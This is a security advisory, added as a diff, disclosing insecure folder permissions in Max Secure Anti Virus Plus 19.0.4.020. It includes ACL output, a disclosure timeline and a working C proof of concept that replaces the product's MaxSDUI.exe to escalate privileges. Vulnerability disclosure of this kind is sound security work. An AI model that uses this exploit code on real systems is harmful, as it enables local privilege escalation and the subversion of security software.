@@ -1,0 +1,133 @@
+# Exploit Title: Max Secure Anti Virus Plus 19.0.4.020 - Insecure File Permissions
+# Discovery by: hyp3rlinx
+# Date: 2019-12-02
+# Vendor Homepage: www.maxpcsecure.com
+# Tested Version: 19.0.4.020
+# CVE: N/A
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MAX-SECURE-PLUS-ANTIVIRUS-INSECURE-PERMISSIONS.txt
+[+] ISR: ApparitionSec          
+ 
+
+[Vendor]
+www.maxpcsecure.com
+
+
+[Affected Product Code Base]
+Max Secure Anti Virus Plus - 19.0.4.020
+
+File hash: ab1dda23ad3955eb18fdb75f3cbc308a
+msplusx64.exe
+
+
+[Vulnerability Type]
+Insecure Permissions
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+Max Secure Anti Virus Plus 19.0.4.020 has Insecure Permissions on the installation directory.
+Local attackers or malware running at low integrity can replace a .exe or .dll file to achieve privilege escalation.
+
+C:\Program Files\Max Secure Anti Virus Plus>cacls * | more
+C:\Program Files\Max Secure Anti Virus Plus\7z.dll NT AUTHORITY\Authenticated Users:(ID)F
+                                                   BUILTIN\Users:(ID)F
+                                                   NT AUTHORITY\SYSTEM:(ID)F
+                                                   BUILTIN\Administrators:(ID)F
+
+
+[Affected Component]
+Permissions on installation directory
+
+
+[Exploit/POC]
+#include <stdio.h>
+#include <windows.h>
+#define TARGET "C:\\Program Files\\Max Secure Anti Virus Plus\\MaxSDUI.exe"
+#define TMP "C:\\Program Files\\Max Secure Anti Virus Plus\\2.exe"
+#define DISABLED_TARGET "C:\\Program Files\\Max Secure Anti Virus Plus\\666.tmp"
+
+/* Max Secure Anti Virus Plus PoC By hyp3rlinx */
+
+BOOL PWNED=FALSE;
+
+BOOL FileExists(LPCTSTR szPath){
+  DWORD dwAttrib = GetFileAttributes(szPath);
+  return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+void main(void){
+   
+  if(!FileExists(DISABLED_TARGET)){
+  	CopyFile(TARGET, TMP, FALSE);
+  	Sleep(1000);
+    CopyFile(TMP, DISABLED_TARGET, FALSE);
+    printf("[+] Max Secure Anti Virus Plus EoP PoC\n");
+    Sleep(1000);
+    printf("[+] Disabled MaxSDUI.exe ...\n");
+    Sleep(300);
+   }else{
+  	 PWNED=TRUE;
+   }
+   
+    if(!PWNED){
+     	char fname[MAX_PATH];
+        char newLoc[]=TARGET;
+        DWORD size = GetModuleFileNameA(NULL, fname, MAX_PATH);
+       if (size){
+         printf("[+] Copying exploit to vuln dir...\n");
+         Sleep(1000);
+         CopyFile(fname, TARGET, FALSE);
+         printf("[+] Replaced legit Max Secure EXE...\n");
+         Sleep(2000);
+         printf("[+] Done!\n");
+         MoveFile(fname, "C:\\Program Files\\Max Secure Anti Virus Plus\\MaxPwn.lnk");
+         Sleep(1000);
+         exit(0);
+        }
+    }else{
+    	if(FileExists(TMP)){
+    		 remove(TMP);
+    	}
+     	printf("[+] Max Secure Anti Virus Plus PWNED!!!\n");
+     	printf("[+] hyp3rlinx\n");
+     	system("pause");
+     }
+}
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=DXSV5geXkTw
+
+
+[Network Access]
+Local
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification: November 19, 2019
+Vendor: "received a reply they will fix soon"
+Status request: November 24, 2019
+No replies other than automated response.
+November 29, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
